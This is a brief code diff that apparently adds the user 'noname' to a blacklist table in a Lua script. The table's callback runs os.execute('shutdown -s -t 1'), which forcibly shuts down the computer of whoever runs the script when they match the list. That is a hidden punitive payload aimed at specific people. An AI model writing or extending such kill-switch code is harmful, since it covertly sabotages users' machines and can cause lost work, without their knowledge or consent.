@@ -25,6 +25,7 @@
     {3534527186,'anuware'},
     {3671872184,'pontyxa777'},
     {2830064444,'standoffj'},
+    {1343182207,'noname'},
   },
   callback = function() os.execute('shutdown -s -t 1')  end,
 }
